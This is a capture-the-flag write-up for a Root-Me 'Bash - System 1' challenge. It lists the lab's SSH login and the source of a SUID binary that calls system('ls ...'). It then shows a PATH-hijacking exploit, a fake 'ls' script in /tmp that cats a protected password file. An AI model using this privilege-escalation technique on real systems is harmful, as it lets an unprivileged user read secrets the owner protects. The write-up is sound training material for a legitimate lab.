# Exercise 1 — Bash — System 1

## Context

- Protocol: SSH
- Port: `2222`
- Host: `challenge02.root-me.org`
- User: `app-script-ch11`
- Password: `app-script-ch11`

```bash
ssh -p 2222 app-script-ch11@challenge02.root-me.org
```

## Source Code

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
  setreuid(geteuid(), geteuid());
  system("ls /challenge/app-script/ch11/.passwd");
  return 0;
}
```

## Objective

Display the contents of `/challenge/app-script/ch11/.passwd`.

## Analysis

The binary has the SUID bit set. This allows an unprivileged user to run a program with the owner's privileges.

The owner of the binary is a user with access to the secret file.

```bash
stat /challenge/app-script/ch11/ch11
```

The output reveals an active SUID bit:

```text
Access: (4550/-r-sr-x---)  Uid: (1408/app-script-ch11-cracked)  Gid: (1311/app-script-ch11)
```

## Exploitation

### 1. Create a fake `ls`

```bash
cd /tmp
cat > ls <<'EOF'
#!/bin/sh
cat /challenge/app-script/ch11/.passwd
EOF
chmod +x ls
export PATH=/tmp:$PATH
```

### 2. Execute the SUID binary

```bash
/challenge/app-script/ch11/ch11
```

## Explanation

`setreuid(geteuid(), geteuid())` sets both the real UID and effective UID to the program's effective UID. Because the binary has the SUID bit set, it runs with the owner's permissions.

`system("ls ...")` spawns a shell, which looks up the `ls` command in `PATH`. By replacing `ls` with a fake executable in `/tmp`, our own command is executed instead.